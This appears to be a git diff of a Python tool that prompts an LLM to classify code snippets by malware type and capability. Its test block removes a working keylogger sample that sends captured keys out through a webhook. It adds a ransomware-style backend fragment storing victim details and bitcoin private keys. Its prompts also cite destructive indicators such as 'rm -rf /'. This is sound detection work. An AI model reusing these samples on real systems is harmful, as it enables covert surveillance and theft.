@@ -4,379 +4,158 @@ import base64
 from google import genai
 from openai import types
 import json
+import textwrap
 from typing import Any, Dict
 
 SYSTEM_PROMPT = """
-### ROLE
-You are an elite Supply Chain Security Expert and Code Auditor. Your mission is to detect, classify, and explain malicious intent within software package updates based on "Realized Capability".
+Role:
+You are a malware-intent auditor for software update code snippets.
 
-### CORE PHILOSOPHY
-1. **INTENT OVER IMPLEMENTATION**: 
-   - Focus on ARCHITECTURE and INTENT.
-   - IGNORE superficial faults (syntax errors, missing imports, undefined variables) IF the malicious logic flow is visible.
-2. **CONTEXT IS KING (The "Honest Code" Rule)**:
-   - Distinguish between "Admin Utilities" (Authorized actions) and "Malware" (Surreptitious actions).
-   - A function named `delete_temp_files` doing file deletion is BENIGN.
-   - A function named `init_display` doing file deletion is MALICIOUS.
-
-### ATTACK TYPE SUCCESS CRITERIA MATRIX (THE LAW)
-
-[Type A: InfoStealer / Spyware]
-- Goal: Steal HIGH-VALUE Secrets (env vars, passwords, tokens, cookies, keystrokes, SSH keys).
-- **ANTI-DEFINITION (BENIGN)**: 
-  * "Diagnostic/Status Reporting": Code that collects system metadata (Public IP, Hostname, OS version, CPU usage, Uptime) AND sends it to a logging channel (especially in `on_ready` or `status` functions) is BENIGN.
-  * Exception: If the IP collection is combined with stealing Credentials/Tokens, it IS Malware.
-- Full: Collects AND Exfiltrates data (HTTP/DNS/SMTP).
-
-[Type B: Backdoor / RAT / Reverse Shell]
-- Goal: Unauthorized remote access/execution.
-- Full: Execution Logic + Connectivity (C2/Listener).
-
-[Type C: Ransomware]
-- Goal: Deny access via encryption.
-- Full: 
-  1. **Active Encryption Logic**: The specific function performing file locking/encryption is PRESENT and defined (e.g., AES/RSA loops).
-  2. **Ransom Demand**: Ransom note generation or deployment logic is present.
-
-[Type D: Wiper]
-- Goal: Irreversibly destroy data for sabotage.
-- **ANTI-DEFINITION (BENIGN)**: Utility functions explicitly named for cleanup (e.g., `clean_cache`, `delete_images`) operating on safe scopes are NOT malware.
-- Full: 
-  1. Targets High-Value/System Paths (/, /etc, C:\\Windows).
-  2. Indiscriminate/Recursive deletion without filters.
-  3. Deceptive Intent (Function name hides the behavior).
-
-[Type E: Clipboard Hijacker]
-- Goal: Swap crypto addresses in clipboard.
-- Full: Successfully reads AND overwrites clipboard.
-
-[Type F: File Infector]
-- Goal: Self-replication by infecting other files.
-- Full: Successfully locates target files AND injects them.
-
-[Type G: Logic Bomb]
-- Goal: Delayed execution based on conditions.
-- Full: Trigger (Time/Env) + Malicious Payload connected.
-
-[Type H: Keylogger / Keystroke Logger]
-- Goal: Capture keystrokes stealthily and exfiltrate.
-- Full: Captures keystrokes AND successfully stores and exfiltrates them.
-
-[Type I: Malware Builder ]
-- Goal: Generate malware binaries/payloads.
-- Full: Contains complete build logic (e.g., uses PyInstaller/Nuitka with all necessary parameters).
-
-[Type J: Uncategorized High-Impact]
-- Full: Any other specific logic causing severe harm/exposure.
-
-
-### CLASSIFICATION LEVELS
-
-1. **Full Attack Chain (Actionable Threat)**
-   - **Criteria**: Meets ALL criteria in the Matrix. The malicious logic is complete, configured, and capable of execution.
-   - **Verdict**: MALICIOUS UPDATE.
-
-2. **Core Attack Chain (Latent Threat / High Confidence)**
-   - **Criteria**: The code misses critical components to execute malicious behavior (e.g., missing exfiltration, missing execution trigger, missing ransom note).
-    - **Constraint**: There must be a visible **Action-Logic** (e.g., a function capturing keys, writing to a file, or processing data), even if incomplete.
-    - **NOT Core**: Mere definitions (Classes, Variables, Imports) without functional body code are NOT Core.
-   - **Verdict**: WARNING UPDATE.
-
-3. **Undetermined Call Chain (Ambiguous / Low Confidence)**
-   - **Criteria**: Isolated **"Dual-Use" components** that lack a demonstrable malicious context.
-   - **Verdict**: BENIGN (Treat as Noise/Safe unless combined with other indicators).
-
-4. **Benign Artifact (Safe / Authorized)**
-   - **Criteria**: The code matches the "ANTI-DEFINITION" or "Honest Code Rule".
-   - **Verdict**: BENIGN UPDATE.
-
-
-### [CRITICAL REFERENCE EXAMPLES] (Learn from these cases)
-
-**CASE 1: The "Skeleton" Trap (Inert Code)**
-- **Input**: 
-  ```python
-  class Keylogger(Thread):
-      def __init__(self):
-          self.log = ""
-  # No on_press, no write_to_file, no send_data
-CLASSIFICATION: Undetermined Call Chain.
-Reasoning: Despite the malicious name "Keylogger", the code is purely declarative. It contains NO "Operational Logic" (Active Verbs). Without a function that actually captures, stores, or sends data, it is inert/dead code.
-
-**CASE 2: The "Dual-Use" Listener (Ambiguous)**
-- **Input**: 
-  ```python
-  def on_press(key):
-      print(f"Key  pressed")
-      if key == Key.esc: return False
-Verdict: Undetermined Call Chain (or Benign).
-Reasoning: This is standard input handling (Dual-Use). There is no attempt to hide, no writing to hidden files, and no network exfiltration. It lacks "Malicious Context".
-
-CASE 3: The "Real" Core (Malicious Intent Visible)
-Input:
-code
-Python
-# Writes to a hidden system file
-def on_press(key):
-    with open("/tmp/.hidden_log", "a") as f: 
-        f.write(str(key))
-Verdict: Core Attack Chain.
-Reasoning: While logic is incomplete (no network send), the intent is malicious because it writes to a HIDDEN file (.hidden_log). The "Stealth" behavior upgrades it from Dual-Use to Core.
-"""
-
-ASSERTION_PROMPT = """
-Analyze the provided code snippet: {code_snippet}
-
-### INSTRUCTIONS
-1. **Identify Intent**: Determine the potential malware type based on the "ATTACK TYPE SUCCESS CRITERIA MATRIX" defined in the System Instructions.
-2. **Check for Benign Context**: Apply the "ANTI-DEFINITION" rules. If the code looks like a standard utility, mark it as "Benign Artifact".
-3. **Determine Chain Status**:
-   - If it is malicious, determine if it is "Full" or "Core" based on the Matrix.
-   - Be specific about what is missing if it is "Core".
-
-### OUTPUT REQUIREMENT
-Provide a structured response:
-- **Malware Type:** (e.g., "Type D: Wiper" or "None")
-- **Classification:** "Full Attack Chain" | "Core Attack Chain" | "Fragmented Attack Chain" | "Benign Artifact"
-- **Missing Components:** Critical missing steps (refer to the Matrix).
-- **Potential Impact:** Description of consequences.
-- **Threat Level:** High/Medium/Low.
-- **Reasoning:** Explain why it fits the specific criteria.
-"""
-
-CHECK_PROMPT = """ 
-You are the Supreme Quality Assurance Auditor. Review the PREVIOUS RESPONSE and the ORIGINAL CODE.
-
-PREVIOUS RESPONSE: 
-{response}
-
-ORIGINAL CODE SNIPPET: 
-{code_snippet}
-
-### AUDIT EXECUTION PLAN
-
-**Step 1: The "Sanity Check" (Benign Filter)**
-- Verify if the code matches the "ANTI-DEFINITION" or "Honest Code Rule".
-- If a function named `cleanup` or `delete_cache` is deleting files, or `on_ready` is logging IP, **OVERRIDE** to "Benign Artifact".
-
-**Step 2: The "Skeleton Check" (Inert Filter)**
-- Look at the code structure. Is it purely declarative (Classes, Imports, `__init__`) without any active logic flow (e.g., no `on_press`, no `encrypt_loop`, no `socket.send`)?
-- If YES, it is Inert/Skeleton code. **OVERRIDE** to "Undetermined Call Chain".
-
-**Step 3: The "Payload Check" (Core vs Full)**
-- If the code passes Step 1 & 2 and is deemed Malicious:
-- Check the "Missing Components".
-- **CRITICAL RULE**: If the missing component is the **CORE PAYLOAD FUNCTION BODY** (e.g., `Encrypt` function is called but not defined, or logic flow implies `upload` but code is missing), you CANNOT classify it as "Full".
-- **CRITICAL RULE**: If the code self can do harm to the system (e.g., file deletion, keylogging, clipboard overwrite), it MUST be at least "Core".
-
-### FINAL OUTPUT
-Respond in JSON format:
-{{
-  "Classification": "Full Attack Chain" | "Core Attack Chain" | "Undetermined Call Chain" | "Benign Artifact",
-  "Missing_Components": "List of critical logic gaps (or 'None').",
-  "Malware_Type": "String",
-  "Threat_Level": "High" | "Medium" | "Low",
-  "Reasoning": "Final verdict explaining the decision process (especially if overridden).",
-  "Potential_Impact": "Specific damage description."
-}}
+Global Rules:
+1) Judge by visible behavior, not names/comments.
+2) If critical behavior is missing from snippet, do not assume it exists.
+3) Distinguish malicious logic from dual-use/admin utility context.
+4) Prefer conservative labeling when evidence is incomplete.
+5) Output JSON only.
+6) Do not infer unseen project context; judge only from code visible in the snippet.
 """
 
 STEP1_PROMPT = """
-You are a Supply Chain Security Expert. Analyze the following code snippet to identify its **PRIMARY INTENT**.
+Task:
+Given the code snippet, detect primary intent category.
 
-CODE SNIPPET:
+Code:
 {code_snippet}
 
----
-### REFERENCE: MALWARE INTENT DEFINITIONS (THE MATRIX)
-[Type A: InfoStealer] Goal: Steal Secrets (passwords, tokens). *Anti-Def*: Diagnostic logs (IP/Hostname) are Benign.
-[Type B: Backdoor/RAT] Goal: Remote access/execution.
-[Type C: Ransomware] Goal: Deny access via encryption.
-**ANTI-DEFINITION (BENIGN)**:
-  * Normal cryptography utilities/libraries (e.g., RSA/AES encrypt + decrypt helpers) for user-provided input/files are Benign by default.
-  * If code includes a working decrypt path/key-management path and no extortion/sabotage behavior, do NOT mark as malicious.
-[Type D: Wiper] Goal: Data destruction. 
-**ANTI-DEFINITION (BENIGN)**: 
-  * "Utility/Cleanup": Utility functions named for cleanup (e.g., `clean_cache`) on safe scopes.
-  * **"Uninstaller / Self-Cleanup" (CRITICAL)**: Code that deletes specific application folders (e.g., in AppData/Temp) or **REMOVES** registry startup keys. This is standard uninstallation logic, NOT a Wiper.
-[Type E: Clipper] Goal: Swap clipboard crypto addresses.
-[Type F: File Infector] Goal: Inject code into other files.
-[Type G: Logic Bomb] Goal: Delayed malicious execution based on conditions.
-[Type H: Keylogger] Goal: Stealthy input capture. *Anti-Def*: Hotkeys/Game inputs are Benign.
-[Type I: Builder] Goal: Generate malware.
-[Type J: Dropper / Downloader]Goal: Deliver and activate a secondary payload.
-Type J requires a visible payload-delivery chain, such as:
-  1) fetch/extract/decode payload bytes from external or embedded source,
-  2) write/drop payload to a new executable/script location,
-  3) execute/launch the dropped payload (or clear execution handoff).
-ANTI-DEFINITION (BENIGN):
-"Installers / Auto-Updaters": Code that downloads files from Official/Trusted Domains.
-Logic: If the URL matches the package metadata or well-known trusted sources, it is Benign.
-Additional Anti-Definition:
-  * Base64 decode + `exec` over local project content (e.g., reading local `source.py`) WITHOUT drop-to-new-location or payload handoff is NOT Type J.
-[Type K: System Interference]Goal: Causes network/keyboard/filesystem disorganization or instability.
-[Type L: Network Propagator]
-- Goal: Self-replicate and spread across networks (Lateral Movement) without user interaction.
-- Critical Distinction: Unlike Type F (which infects local files), Type L infects *other machines*(usually network neighbors).
-[Type M: High-Impact] Goal: Severe harm/exposure that influences system integrity or usability.
----
+Decision Flow:
+1) Benign Filter:
+- If behavior matches normal utility/installer/updater/admin function with no malicious indicators -> Benign.
 
-### TRIAGE LOGIC (STRICT DECISION FLOW)
+2) Ambiguity Filter:
+- Dangerous APIs/tools alone (e.g., subprocess, cryptography, base64, keyboard hooks) without harmful workflow -> Undetermined.
+- Bare connectivity alone is ambiguous -> Undetermined.
 
-**1. CHECK FOR BENIGN CONTEXT (The "Anti-Definition" Filter)**
-   - Does the code match a legitimate use case explicitly?
-   - **Verdict**: If YES -> **Benign Artifact**.
+3) Malicious Intent Match (pick one primary type):
+- Type A InfoStealer: collects sensitive data (credentials/tokens/keys/cookies/etc).
+- Type B Backdoor/RAT: remote control channel + command/session handling.
+- Type C Ransomware: encryption used to deny access (not just normal crypto helper).
+- Type D Wiper: destructive deletion/overwrite at harmful scope.
+- Type E Clipper: clipboard wallet replacement.
+- Type F File Infector: injects/patches other files.
+- Type G Logic Bomb: trigger condition tied to malicious payload.
+- Type H Keylogger: active key capture with stealth/collection intent.
+- Type I Builder: generates malware artifacts.
+- Type J Dropper/Downloader: payload delivery chain intent.
+- Type K System Interference: disrupts normal system usability.
+- Type L Worm:
+  - L-File/Device Worm: self-replication/infection across files, removable media, archives, or shared folders/devices.
+  - L-Network Worm: self-propagation across network hosts.
+- Type M High-Impact: clearly harmful logic not covered above.
 
-**2. CHECK FOR AMBIGUITY (The "Dual-Use" Filter)**
-   - **Scenario**: The code uses dangerous tools (`ngrok`, `pynput`, `subprocess`, `cryptography`) BUT lacks "Malicious Indicators".
-   - **Rule A (Setup vs Attack)**: If the code ONLY downloads/installs/configures a tool (e.g., `wget ngrok`) but does NOT execute it with malicious args -> **Undetermined**.
-   - **Rule B (Skeleton Code)**: If the code defines classes/imports (e.g., `class Keylogger`) but lacks operational logic (no `hook`, no `send`) -> **Undetermined**.
-   - **Verdict**: If it falls here -> **Undetermined Call Chain**.
+Type D vs Type K Disambiguation (MANDATORY):
+- Type D (Wiper) requires explicit destructive intent against existing meaningful targets (e.g., user/system files, disks, partitions, backups, DB/data stores), with irreversible damage actions such as delete/overwrite/corrupt/format.
+- Type K (System Interference) covers disruption/resource-abuse behavior that degrades usability without clear targeted irreversible wiping semantics (e.g., infinite file spam, process kill loops, startup abuse, CPU/disk exhaustion, lock-screen nuisance).
+- If code mainly creates junk files or repeatedly overwrites newly-created/random files, classify as Type K, not Type D.
+- If both appear, choose the dominant implemented behavior in this snippet.
 
-**3. CHECK FOR MALICE (The "Malicious Indicator" Filter)**
-   - If it survives filters 1 & 2, look for **Positive Proof of Malice**:
-   - **Indicator A (Targeting)**: Hardcoded system paths (`/etc/passwd`, `/`, `C:\\Windows`) OR sensitive info.
-   - **Indicator B (Evasion)**: Obfuscation (Base64/Hex/Eval), hidden file attributes, or anti-analysis checks.
-   - **Indicator C (Intentional Chaos)**: keyboard locking, network disconnection, file system disruption, etc.
-   - **Indicator D (Aggressive Action)**: `rm -rf /`, destructive overwrite, `exec` connecting to C2.
-   - **Verdict**: If ANY indicator exists -> **Malicious** (Assign Type A-L).
-   
-   
-### [CRITICAL REFERENCE EXAMPLES] (Learn from these cases)
-CASE 1: The "Real" Core (Malicious Intent Visible)
-Input:
-code
-Python
-# Writes to a hidden system file
-def on_press(key):
-    with open("/tmp/.hidden_log", "a") as f: 
-        f.write(str(key))
-Verdict: Core Attack Chain.
-Reasoning: While logic is incomplete (no network send), the intent is malicious because it writes to a HIDDEN file (.hidden_log). The "Stealth" behavior upgrades it from Dual-Use to Core.
+Type F vs Type L Disambiguation (MANDATORY):
+- Type F is local file infection/patching behavior without clear autonomous spread to new hosts/devices.
+- Type L requires propagation logic (self-copy/infect + spread target discovery/iteration) intended to replicate beyond a single local target.
+- If code performs autonomous spread across drives/removable media/shared locations or network hosts, prefer Type L over Type F.
 
-### FINAL OUTPUT FORMAT (JSON ONLY)
+Hard Constraints:
+- Obfuscation alone is not sufficient for malicious.
+- Type J is not satisfied by local base64+exec wrapper alone.
+- Normal encryption/decryption utility without extortion/sabotage context is not Type C.
+- If dominant visible behavior is disruption/anti-analysis/persistence/recon, prefer Type K over Type J.
+- Do not label Type D unless destructive targeting of existing meaningful assets is explicit in this snippet.
+- Do not label Type L unless propagation behavior (beyond one local target) is explicit in this snippet.
+- If Type L is selected, specify subtype in "Malware Type" as "Type L (L-File/Device Worm)" or "Type L (L-Network Worm)".
+- Select exactly one primary type based on dominant visible behavior in this snippet.
+- Do not infer missing context/files/functions; if key evidence is absent in this snippet, keep classification conservative.
+
+Output JSON:
 {{
     "Detected Category": "Malicious" | "Undetermined" | "Benign",
-    "Malware Type": "Type X (if Malicious) / None",
-    "Primary Logic": "Brief description of what the code does",
-    "Decision Factor": "e.g., Setup only (Undetermined) OR Hardcoded system path (Malicious)"
+    "Malware Type": "Type A|B|C|D|E|F|G|H|I|J|K|M | Type L (L-File/Device Worm) | Type L (L-Network Worm) | None",
+    "Primary Logic": "One-sentence behavior summary",
+    "Decision Factor": "Key evidence that determined the label"
 }}
 
 """
 
 STEP2_PROMPT = """
-You are a Code Auditor. Based on the Intent Analysis from Step 1, determine the "Realized Capability" (Full vs Core).
+Task:
+Given Step1 result and snippet, classify capability level.
 
-CODE SNIPPET:
+Code:
 {code_snippet}
 
-STEP 1 ANALYSIS:
+Step1:
 {step1_analysis}
 
----
-REFERENCE: FULL ATTACK CHAIN CRITERIA
+Capability Labels:
+- Full Attack Chain: all critical steps for the selected type are visible.
+- Core Attack Chain: malicious intent exists, but at least one critical step is missing.
+- Undetermined Call Chain: insufficient/ambiguous evidence.
+- Benign Artifact: legitimate context.
 
-[Type A: InfoStealer / Spyware]
-- Full Criteria:
- 1. Data Collection: Accesses Sensitive Sources (Env vars, Files, Browser data, Wallets).
- 2. Exfiltration Channel: Successfully implements a transmission mechanism (HTTP, DNS, SMTP, Webhook, WebSocket, or Public API).
- 3. Data Flow Connectivity: The payload being transmitted MUST be traceable back to the sensitive data collected in Step 1.
-  
-[Type B: Backdoor / RAT / Reverse Shell]
-- Full Criteria:
- 1. Remote Connectivity: Connects to an external controller (Client/Reverse mode) OR opens a local port and accepts remote sessions (Server/Bind mode).
- 2. Mode-Specific Capability:
-    - **Client/Reverse Backdoor**: MUST include command execution capability (e.g., subprocess/os.system/eval) or equivalent execution dispatcher.
-    - **Server/Bind Backdoor**: command execution API may be indirect/hidden; explicit `subprocess` is NOT strictly required if the code clearly implements remote interactive control/session handling and command forwarding protocol.
- 3. Evidence of Unauthorized Control Intent: session loop, command channel, or instruction handling beyond benign local admin service patterns.
+Type-Specific Full Criteria (compact):
+- Type A InfoStealer: sensitive collection + exfil channel + clear data-flow linkage.
+- Type B Backdoor/RAT:
+  - Client/Reverse Full: outbound C2 connectivity + remote task execution capability.
+  - Server/Bind Full: inbound listener/session control + command/task handling capability.
+  - Task execution can be arbitrary shell OR restricted operator actions (e.g., file browse/download/upload, process control, screenshot/recording, data exfiltration).
+  - Task execution is present (e.g., cd/ls/upload/download), do NOT require arbitrary shell execution for Type B Full.
+  - Endpoint value alone is not a blocker: localhost/127.0.0.1/private/test addresses still satisfy C2 endpoint evidence if connect/listen + command flow are implemented.
+- Type C Ransomware: target traversal/selection + active encryption + ransom demand note.
+- Type D Wiper: destructive deletion/overwrite at harmful scope.
+- Type E Clipper: clipboard pattern match + replacement action.
+- Type F File Infector: find target files + inject/modify them.
+- Type G Logic Bomb: trigger condition + malicious payload linked.
+- Type H Keylogger: active key capture + storage/exfil implementation.
+- Type I Builder: complete malware build pipeline.
+- Type J Dropper/Downloader: ONLY when a distinct secondary payload is obtained/extracted, staged to a new location, and execution is handed off to that payload.
+- Type K System Interference: disruptive system-interference actions are implemented and executable (e.g., anti-analysis or persistence abuse or user/system disruption).
+- Type L Worm:
+  - L-File/Device Worm Full: target discovery across files/drives/removable/shared locations + self-copy/infection action + execution handoff on replicated target.
+  - L-Network Worm Full: host discovery/scanning + propagation mechanism (exploit/credential abuse/remote copy) + remote execution handoff on other hosts.
+- Type M High-Impact: other high-impact harmful action is clearly implemented and executable, not better covered by A-L.
 
-[Type C: Ransomware]
-- Full Criteria: 
- 1. File Traversal: Code to iterate through directories/drives (Goal: Find targets).
- 2. Active Encryption/Locking: The specific function for encryption is PRESENT and DEFINED (Not just a call).
- 3. Extortion Intent: Code to drop a ransom note, or demand payment.
- Note on "Extortion":
-"Extortion Intent" is proved ONLY by the presence of a Ransom Note/Demand.
-File encryption/deletion alone proves "Destructive Intent" or "Sabotage", NOT "Extortion".
-    
-[Type D: Wiper]
-Full Criteria:
- 1. Mass Destruction Logic: Iterates through directories to delete/overwrite files.
- 2. Lack of Constraints: Operates indiscriminately (e.g., rm -rf /, deletes all extensions) OR Targets System/Critical Paths.
-Note: "Deceptive Intent" is a supporting indicator, not a strict requirement for "Full".
-Variant: Destructive Encryption: Encrypting files WITHOUT saving/exfiltrating the key (making recovery impossible) counts as a Full Wiper, even if no files are deleted.
+Type D vs Type K Capability Boundary (MANDATORY):
+- Type D Full/Core must be tied to destructive actions on existing meaningful assets (mass delete/overwrite/corrupt/format) with harmful scope.
+- Type K Full/Core applies when implemented behavior is disruptive/system-abusive but not explicit targeted wiping (e.g., junk-file flood, fork/resource exhaustion, persistent nuisance loops, process/service disruption).
+- File-creation flood or overwrite of attacker-created/random junk files should be Type K by default.
 
-[Type E: Clipboard Hijacker]
-Full Criteria:
- 1. Pattern Matching: Uses Regex to identify specific patterns (e.g., Crypto Wallet addresses) in clipboard data.
- 2. Replacement implementation: Overwrites the clipboard with a hardcoded attacker address.
+Type F vs Type L Capability Boundary (MANDATORY):
+- Type F Full/Core: file infection/patching is implemented, but autonomous cross-target propagation is not explicit.
+- Type L Full/Core: autonomous propagation intent is explicit (iterating targets and replicating/infecting beyond a single local target), including file/device spread or network-host spread.
+- If snippet shows only local infection primitive without clear spread loop/target discovery, classify as Type F, not Type L.
 
-[Type F: File Infector]
-- Full Criteria: Successfully locates target files AND injects them.
+Hard Constraints:
+- Missing critical step => cannot be Full.
+- External undefined payload/function => treat as missing.
+- Benign installer/updater from trusted source with expected behavior => Benign/Undetermined.
+- Do not infer unseen project context; judge only from code visible in the snippet.
+- Do not claim established network/C2 connection unless explicit bootstrap appears in this snippet (e.g., run/login/connect/handshake).
+- Do not downgrade any type solely due to placeholder/invalid constants (e.g., email creds, API keys, URLs, IPs, domains, paths) when core malicious logic flow is present.
+- Do not classify as Type J if the snippet only shows self-copy/hiding/persistence/recon/anti-analysis without distinct secondary payload retrieval/extraction + handoff.
+- If dominant behavior is disruption/anti-analysis/persistence/recon (e.g., taskkill, schtasks/startup, system recon), prefer Type K over Type J.
+- Do not classify as Type D when evidence only shows nuisance spam/resource interference without explicit destructive targeting of existing meaningful assets.
+- Do not classify as Type L when cross-target propagation is not explicit in visible code.
+- If Type L is selected, "Malware_Type" must include subtype: "Type L (L-File/Device Worm)" or "Type L (L-Network Worm)".
+- Only downgrade Full to Core when attack-critical logic is missing (e.g., no connect/listen/send/exfil/encrypt/execute path), not when literal constants seem nonfunctional.
+- "Missing_Components" must include only attack-critical gaps (e.g., no C2 channel, no payload execution, no exfiltration path, no ransom demand).
+Do NOT list software quality issues such as error handling, retries, logging, code style, or exception coverage.
 
-[Type G: Logic Bomb]
-- Full Criteria: Trigger (Time/Env) + Malicious Payload connected.
 
-[Type H: Keylogger / Keystroke Logger]
-Full Criteria:
- 1. Active Capture: Hooks keyboard events or reads input streams.
- **CRITICAL**: Processing data passed via function arguments (e.g., `def send(keys)`) does NOT count as Active Capture.
- 2. Data Leakage: Code implementation to Store (to HIDDEN FILE) AND Exfiltrate (Network) the captured logs.
- **CRITICAL**: The actual implementation body (e.g., `requests.post`, `f.write`) must be **VISIBLE** and **SYNTACTICALLY COMPLETE** in the snippet. 
-
-[Type I: Malware Builder]
-- Full Criteria: Contains complete build logic and implementation (e.g., uses PyInstaller/Nuitka with all necessary parameters).
-
-[Type J: Dropper / Downloader]
-- Full Criteria:
-  1. Payload Delivery: obtains payload from untrusted external source OR extracts embedded payload bytes.
-  2. Payload Staging: writes/drops payload to a new file/location.
-  3. Activation: executes/launched payload or clearly hands off execution.
-  4. If any of 1-3 is missing, downgrade to Core/Undetermined based on context.
-
-[Type K: System Interference]
-- Full Criteria: Implements disruptive actions (e.g., network disconnection, disabling input devices, altering system settings) that degrade system usability or integrity.
-
-[Type L: Network Propagator]
-- Full Criteria: 
-  1. **Target Discovery**: Logic to generate IP ranges, scan subnets, or harvest contact lists (Email/SSH known_hosts).
-  2. **Propagation Mechanism**: Logic to COPY the payload to the target (via SSH/SCP, SMB, Email, or Exploit).
-
-[Type M: Uncategorized High-Impact]
-- Full Criteria: The harmful action is fully implemented and executable.
----
-
-### CLASSIFICATION RULES
-
-**Core Attack Chain**: 
-   - Malicious Intent is clear.
-   - BUT fails the "Full Criteria" due to missing critical components.
-   - If the missing component is **Auxiliary** (e.g., logging, watermarking, version printing, fancy error handling), IGNORE it. Do NOT classify as Core.
-
-**Full Attack Chain**: 
-   - Meets ALL "Full Criteria" for the specific Type.
-   - Logic is complete, configured, and actionable.
-
- [THE "CONTEXTUAL VISIBILITY" RULE (CRITICAL)]:
-   - **Goal**: Verify if critical logic (Network/Encryption/malicious payload) is actually present.
-   - **Procedure**:
-     A. **Standard Libraries**: If it uses `os`, `subprocess`, `requests`, `socket`, `smtplib`, etc. -> **VERIFIED**.
-     B. **In-Context Definitions (The "Bundled" Check)**: 
-        - If the code imports a custom class (e.g., `from core.bsky_client import BskyClient`), you MUST search the **ENTIRE** snippet for `class BskyClient` or `def BskyClient`. Same as sub-functions.
-        - **IF FOUND**: Treat it as **VERIFIED / FULLY IMPLEMENTED**. (Ignore the import statement as it might be a concatenated file).
-        - **IF NOT FOUND**: Treat it as **MISSING / EXTERNAL**. -> Downgrade to **Core**.
-   - C. **External Calls**: If it calls functions/payloads NOT defined in the snippet and NOT from standard libraries (e.g., `upload_data()`, `encrypt_files()`), TREAT them as **MISSING / EXTERNAL** -> Downgrade to **Core**.
-
-Quality != Capability:
-Do NOT downgrade to "Core" just because the code lacks robust error handling, retry logic, or advanced persistence, providing the primary Attack Loop (Command -> Execution -> Exfiltration) is logically complete.
-
-### FINAL OUTPUT (JSON ONLY)
+Output JSON:
 {{
   "Classification": "Full Attack Chain" | "Core Attack Chain" | "Undetermined Call Chain" | "Benign Artifact",
-  "Malware_Type": "String (e.g., 'Type C: Ransomware')",
-  "Missing_Components": "List critical gaps or 'None'.",
+  "Malware_Type": "Type X xxxx | None",
+  "Missing_Components": "None | concise missing critical steps",
   "Threat_Level": "High" | "Medium" | "Low",
-  "Reasoning": "Explain the decision based on the Full Criteria."
+  "Reasoning": "Concise evidence-based justification"
 }}
 """
 
@@ -387,6 +166,14 @@ class LLM_Evaluate:
             base_url=base_url,
         )
         self.conversation_history = []
+
+    def _normalize_code_snippet(self, code_snippet: str) -> str:
+        if code_snippet is None:
+            return ""
+        snippet = str(code_snippet)
+        snippet = snippet.replace("\r\n", "\n").replace("\r", "\n")
+        snippet = textwrap.dedent(snippet).strip("\n")
+        return snippet + ("\n" if snippet else "")
 
     def _safe_json_loads(self, content: str) -> Dict[str, Any]:
         try:
@@ -461,7 +248,8 @@ class LLM_Evaluate:
         return normalized
 
     def malware_analyze_two_steps(self, code_snippet):
-        assertion_prompt = STEP1_PROMPT.format(code_snippet=code_snippet)
+        normalized_code = self._normalize_code_snippet(code_snippet)
+        assertion_prompt = STEP1_PROMPT.format(code_snippet=normalized_code)
         response_1_raw = self._chat_json_with_retry(assertion_prompt)
         response_1 = self._normalize_step1_output(response_1_raw)
 
@@ -469,40 +257,12 @@ class LLM_Evaluate:
         if response_1.get("Detected Category") in {"Benign", "Undetermined"}:
             return response_1
 
-        check_prompt = STEP2_PROMPT.format(step1_analysis=response_1, code_snippet=code_snippet)
+        check_prompt = STEP2_PROMPT.format(step1_analysis=response_1, code_snippet=normalized_code)
         response_2_raw = self._chat_json_with_retry(check_prompt)
         return self._normalize_step2_output(response_2_raw)
         
 
-    def malware_analyze(self, code_snippet):
-        assertion_prompt = ASSERTION_PROMPT.format(code_snippet=code_snippet)
-        completion = self.client.chat.completions.create(
-            model="deepseek-v3-1-250821",
-            messages=[
-                {"role": "system", "content": SYSTEM_PROMPT},
-                {"role": "user", "content": assertion_prompt}
-            ],
-            temperature=0,
-            seed=42
-        )
-        
-        response_1 = completion.choices[0].message.content
-        # print("Initial LLM Response:")
-        # print(response_1)
-        check_prompt = CHECK_PROMPT.format(response=response_1, code_snippet=code_snippet)
-        completion = self.client.chat.completions.create(
-            model="deepseek-v3-1-250821",
-            messages=[
-                {"role": "system", "content": SYSTEM_PROMPT},
-                {"role": "user", "content": check_prompt}
-            ],
-            response_format={"type": "json_object"},
-            temperature=0,
-            seed=42
-        )
-        response_2 = completion.choices[0].message.content
-        return json.loads(response_2)  # 解析JSON字符串为Python字典
-        
+
     
     def sensitive_api_check(self, code_snippet):
         completion = self.client.chat.completions.create(
@@ -534,37 +294,236 @@ class LLM_Evaluate:
 
 if __name__ == "__main__":
     code_snippet = r'''
-from pynput import keyboard
-from dhooks import Webhook
-import threading
-import time
-
-def on_press(key):
+from cryptography.hazmat.primitives.asymmetric import (
+    rsa,
+    ec,
+    padding as asymmetric_padding,
+)
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.backends import default_backend
+class ECC:
+        return serialized_public_key
+class RSA:
+    def decrypt_data(self, encrypted_data):
+        unencrypted_data = self._private_key.decrypt(
+            encrypted_data, self._get_padding()
+        )
+        return unencrypted_data
+        return serialized_public_key
+import sqlite3
+import logging
+def create_connection():
     try:
-        log = key.char
-    except AttributeError:
-        return
-    with open("keylog.txt", "a") as file:
-        file.write(log)
-def llistener():
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
-def send():
-    with open("keylog.txt", "r") as file:
-        content = file.read()
-    if not content.strip():
-        return
-    hook.send(content)
-    with open("keylog.txt", "r+") as con:
-        con.seek(0)
-        con.truncate()
-    time.sleep(300)
-thread1 = threading.Thread(target=llistener())
-thread1.start()
-thread2 = threading.Thread(target=send)
-thread2.start()
-thread1.join()
-thread2.join()
+        connection = sqlite3.connect("data.db")
+        return connection
+    except Exception as err:
+        raise err
+def create_tables():
+    connection = create_connection()
+    cursor = connection.cursor()
+    statistics_table = """CREATE TABLE IF NOT EXISTS `statistics` (`client_id` VARCHAR(100) NOT NULL,`platform` VARCHAR(75) DEFAULT NULL,`architecture` VARCHAR(75) DEFAULT NULL,`ip_address` VARCHAR(75) DEFAULT NULL,`mac_address` VARCHAR(75) DEFAULT NULL,`device_name` VARCHAR(75) DEFAULT NULL,`username` VARCHAR(75) DEFAULT NULL,`is_admin` BOOLEAN DEFAULT NULL DEFAULT NULL, `created_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`client_id`));"""
+    cursor.execute(statistics_table)
+    bitcoin_details = """CREATE TABLE IF NOT EXISTS `bitcoin_details` (`client_id` VARCHAR(100) NOT NULL,`wallet_address` VARCHAR(1000) NOT NULL,`public_key` VARCHAR(1000) NOT NULL,`wif_private_key` VARCHAR(1000) NOT NULL, `created_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`client_id`,`wallet_address`));"""
+    cursor.execute(bitcoin_details)
